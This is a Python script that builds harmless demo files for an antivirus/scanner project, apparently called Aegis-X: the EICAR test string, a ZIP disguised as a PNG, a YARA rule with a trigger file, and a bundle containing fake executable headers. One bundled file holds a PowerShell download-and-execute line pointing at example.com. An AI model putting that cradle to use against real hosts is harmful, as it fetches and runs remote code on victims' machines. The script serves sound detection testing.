"""
Aegis-X Test & Demo Sample Generator
Creates safe test cases to demonstrate all Aegis-X detection engines.
"""

import os
import zipfile
from pathlib import Path

DEMO_DIR = Path(__file__).parent / "demo_samples"
RULES_DIR = Path(__file__).parent / "rules" / "yara"


def generate_all_samples():
    DEMO_DIR.mkdir(exist_ok=True)
    RULES_DIR.mkdir(parents=True, exist_ok=True)

    print("==========================================")
    print("Generating Aegis-X Safe Demo Test Cases...")
    print("==========================================")

    # 1. EICAR Standard Antivirus Test File (For ClamAV / Virus Detection)
    eicar_string = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    eicar_path = DEMO_DIR / "eicar_test.txt"
    eicar_bak = DEMO_DIR / "eicar_test.txt.bak"
    with open(eicar_path, "w") as f:
        f.write(eicar_string)
    with open(eicar_bak, "w") as f:
        f.write(eicar_string)
    print(f"[OK] 1. ClamAV Test File: {eicar_path.name} (and {eicar_bak.name})")

    # 2. File Extension Mismatch (A ZIP archive renamed to .png photo)
    fake_png_path = DEMO_DIR / "fake_document.png"
    # Write PK header (Zip signature) into a file named .png
    with zipfile.ZipFile(fake_png_path, "w") as zf:
        zf.writestr("hidden_payload.txt", "This is an executable payload disguised as PNG")
    print(f"[OK] 2. Extension Mismatch File: {fake_png_path.name}")

    # 3. YARA Target File & Rule
    yara_rule_path = RULES_DIR / "demo_threat_rule.yar"
    yara_rule_content = """
rule AegisX_Demo_Suspicious_Keyword {
    meta:
        description = "Detects demo threat keyword"
        author = "Aegis-X Review Demo"
        severity = "High"
    strings:
        $str1 = "AEGISX_SUSPICIOUS_PAYLOAD_TRIGGER"
    condition:
        $str1
}
"""
    with open(yara_rule_path, "w") as f:
        f.write(yara_rule_content)

    yara_sample_path = DEMO_DIR / "yara_trigger_sample.txt"
    with open(yara_sample_path, "w") as f:
        f.write("Normal text header...\nAEGISX_SUSPICIOUS_PAYLOAD_TRIGGER\nFooter content.")
    print(f"[OK] 3. YARA Rule & Target File: {yara_sample_path.name} (Rule: {yara_rule_path.name})")

    # 4. Suspicious Archive (Contains .exe and .ps1 script)
    archive_path = DEMO_DIR / "suspicious_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as zf:
        zf.writestr("setup.exe", b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00")
        zf.writestr("malicious_script.ps1", "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com')")
        zf.writestr("invoice.pdf.exe", b"MZ\x90\x00")
    print(f"[OK] 4. Suspicious Archive: {archive_path.name}")

    # 5. PE Binary Sample (Copies Windows calc.exe safely)
    calc_src = Path(os.environ.get("SystemRoot", "C:\\Windows")) / "System32" / "calc.exe"
    pe_sample_path = DEMO_DIR / "test_pe_binary.exe"
    if calc_src.exists():
        with open(calc_src, "rb") as src, open(pe_sample_path, "wb") as dst:
            dst.write(src.read())
        print(f"[OK] 5. PE Executable Sample: {pe_sample_path.name} (copied from calc.exe)")
    else:
        print("[!] 5. Could not locate calc.exe, skipped PE binary copy.")

    print("\nAll demo samples successfully generated in:")
    print(f" -> {DEMO_DIR.absolute()}")
    print("\nHow to show your reviewer:")
    print(" 1. Launch Aegis-X (`python -m app.main`)")
    print(" 2. Open 'Browser Scanner' tab -> Add Folder -> Select 'demo_samples'")
    print(" 3. Click 'Scan Now' to watch Aegis-X analyze all test cases live!")


if __name__ == "__main__":
    generate_all_samples()
